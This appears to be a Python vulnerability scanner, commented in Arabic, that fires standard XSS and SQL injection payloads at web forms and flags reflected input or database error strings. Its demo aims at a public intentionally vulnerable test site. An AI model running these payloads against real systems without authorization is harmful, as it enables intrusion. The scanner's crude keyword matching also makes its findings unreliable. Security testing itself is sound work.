import requests
import json
import os
import logging
import time
import random
from urllib.parse import urljoin
import urllib3

# إيقاف تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    '''
    ماسح ثغرات أساسي يختبر النماذج بحمولات معروفة (XSS, SQLi).
    يدعم headers مخصصة وتأخير بين الطلبات.
    '''
    def __init__(self, forms, base_url=None, headers=None, delay=1):
        '''
        forms: قائمة النماذج المستخرجة من الزاحف (كل نموذج بصيغة dict)
        base_url: رابط أساسي اختياري إذا لم يكن موجوداً في كل نموذج
        headers: قاموس يحتوي على headers مخصصة (مثل User-Agent)
        delay: عدد الثواني للتأخير بين الطلبات (افتراضي 1 ثانية)
        '''
        self.forms = forms
        self.base_url = base_url
        self.headers = headers or {}
        self.delay = delay
        self.results = []
        # حمولات XSS أولية
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        # حمولات SQL Injection أولية
        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "admin'--",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]
        # مجلد حفظ النتائج
        self.data_dir = "data"
        os.makedirs(self.data_dir, exist_ok=True)

    def test_xss(self, form):
        '''
        اختبار نموذج لثغرات XSS مع مراعاة التأخير والـ headers.
        '''
        action = form.get('action')
        method = form.get('method', 'GET')
        inputs = form.get('inputs', [])

        if not inputs:
            return None

        if self.base_url and not action.startswith('http'):
            action = urljoin(self.base_url, action)

        for payload in self.xss_payloads:
            # تأخير قبل كل طلب (إذا كان delay > 0)
            if self.delay > 0:
                sleep_time = self.delay + random.uniform(0, 0.5)
                time.sleep(sleep_time)

            data = {}
            for inp in inputs:
                inp_name = inp.get('name')
                if inp_name and inp.get('type') != 'submit':
                    data[inp_name] = payload

            try:
                if method.upper() == 'POST':
                    response = requests.post(action, data=data, timeout=10, verify=False, headers=self.headers)
                else:
                    response = requests.get(action, params=data, timeout=10, verify=False, headers=self.headers)

                # فحص الاستجابة لوجود علامات XSS
                if payload in response.text and not response.text.count(payload) < 2:
                    return {
                        'vulnerability': 'XSS',
                        'payload': payload,
                        'method': method,
                        'action': action,
                        'confidence': 'high'
                    }
                if '<script>' in response.text or 'alert(' in response.text:
                    return {
                        'vulnerability': 'XSS (reflected?)',
                        'payload': payload,
                        'method': method,
                        'action': action,
                        'confidence': 'medium'
                    }
            except Exception as e:
                logger.debug(f"خطأ أثناء اختبار XSS على {action}: {e}")
                continue
        return None

    def test_sqli(self, form):
        '''
        اختبار نموذج لثغرات SQL Injection مع مراعاة التأخير والـ headers.
        '''
        action = form.get('action')
        method = form.get('method', 'GET')
        inputs = form.get('inputs', [])

        if not inputs:
            return None

        if self.base_url and not action.startswith('http'):
            action = urljoin(self.base_url, action)

        for payload in self.sqli_payloads:
            if self.delay > 0:
                sleep_time = self.delay + random.uniform(0, 0.5)
                time.sleep(sleep_time)

            data = {}
            for inp in inputs:
                inp_name = inp.get('name')
                if inp_name and inp.get('type') != 'submit':
                    data[inp_name] = payload

            try:
                if method.upper() == 'POST':
                    response = requests.post(action, data=data, timeout=10, verify=False, headers=self.headers)
                else:
                    response = requests.get(action, params=data, timeout=10, verify=False, headers=self.headers)

                text_lower = response.text.lower()
                sql_errors = [
                    "sql", "mysql", "syntax error", "unclosed quotation mark",
                    "you have an error in your sql", "warning: mysql",
                    "odbc", "driver", "db2", "postgresql", "oracle"
                ]
                for error in sql_errors:
                    if error in text_lower:
                        return {
                            'vulnerability': 'SQL Injection',
                            'payload': payload,
                            'method': method,
                            'action': action,
                            'confidence': 'high',
                            'error': error
                        }
            except Exception as e:
                logger.debug(f"خطأ أثناء اختبار SQLi على {action}: {e}")
                continue
        return None

    def scan_all(self):
        '''
        فحص جميع النماذج.
        '''
        logger.info("بدء فحص الثغرات...")
        for idx, form in enumerate(self.forms):
            logger.info(f"فحص النموذج {idx+1}/{len(self.forms)}: {form.get('action', 'N/A')}")
            xss_result = self.test_xss(form)
            if xss_result:
                xss_result['form'] = form
                self.results.append(xss_result)
            sqli_result = self.test_sqli(form)
            if sqli_result:
                sqli_result['form'] = form
                self.results.append(sqli_result)

        logger.info(f"انتهى الفحص. تم العثور على {len(self.results)} ثغرة.")
        return self.results

    def save_results(self, filename=None):
        '''
        حفظ النتائج في ملف JSON داخل مجلد data.
        '''
        if filename is None:
            import datetime
            filename = f"scan_results_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(self.data_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=4)
        logger.info(f"تم حفظ النتائج في {filepath}")
        return filepath

if __name__ == "__main__":
    # نموذج تجريبي مع headers مخصصة
    test_forms = [
        {
            'action': 'http://testphp.vulnweb.com/search.php?test=query',
            'method': 'POST',
            'inputs': [
                {'name': 'searchFor', 'type': 'text'},
                {'name': 'goButton', 'type': 'submit'}
            ]
        }
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    scanner = VulnerabilityScanner(test_forms, headers=headers, delay=1)
    results = scanner.scan_all()
    print("نتائج الفحص:", results)
    scanner.save_results("test_scan.json")